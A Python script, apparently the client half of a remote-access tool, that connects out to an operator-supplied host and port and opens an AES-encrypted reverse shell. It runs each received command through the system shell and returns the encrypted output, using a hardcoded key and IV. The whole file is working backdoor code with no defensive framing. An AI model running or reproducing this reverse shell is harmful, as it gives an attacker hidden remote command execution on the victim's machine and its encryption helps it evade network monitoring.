#!/usr/bin/env python3
import socket
import subprocess
import os
import sys
import re
from Crypto.Cipher import AES

KEY = b'm6kOQIGDSy8Q1NOjzvzFXmBg7nPLMccn'
IV = b'PEXjL8hqty0OlOV5'

def recvall(s, t=0.5):
    s.settimeout(t)
    data = b''  
    while True:
        oldLen = len(data)
        try:
            data += s.recv(4096)
            if len(data) > oldLen:
                continue
            else:
                break
        except:
            break
    return data

def pad(data):
    if len(data) % 16 != 0:
        data += b'\x00' * (16 - (len(data) % 16))
    return data

def encrypt(data):
    ctx = AES.new(KEY, AES.MODE_CBC, IV)
    return ctx.encrypt(pad(data))

def decrypt(data):
    ctx = AES.new(KEY, AES.MODE_CBC, IV)
    return ctx.decrypt(pad(data))

def parse_and_execute(cmd):
    cmd = cmd.replace(b'\x00', b'')
    cmd = cmd.decode().strip()
    
    if cmd == 'quit':
        sys.exit(0)
    
    p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                          stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    
    stdoutput = p.stdout.read() + p.stderr.read()


    if re.match('^cd .*', cmd):
        try:
            directory = cmd.split('cd ')[-1]
            os.chdir(directory)
            stdoutput = '{}'.format(os.getcwd())
        except:
            stdoutput = 'Couldn\'t change directory to: {}'.format(directory)
        
    return encrypt(stdoutput)

def main(ip, port):
    client = socket.socket()
    client.settimeout(10)

    try:
        client.connect((ip, port))
    except:
        sys.exit(0)
    
    while True:
        RecvBuffer = decrypt(recvall(client))
        if len(RecvBuffer) == 0:
            continue
        SendBuffer = parse_and_execute(RecvBuffer)

        if len(SendBuffer) == 0:
            SendBuffer = b'\x00'

        print(SendBuffer, len(SendBuffer))
        client.send(SendBuffer)

if __name__ == "__main__":

    if len(sys.argv) > 2:
        host = sys.argv[1]
        port = int(sys.argv[2], 10)
    else:
        print("[-] Usage: ./client.py <host> <port>")
        sys.exit(1)
    
    main(host, port)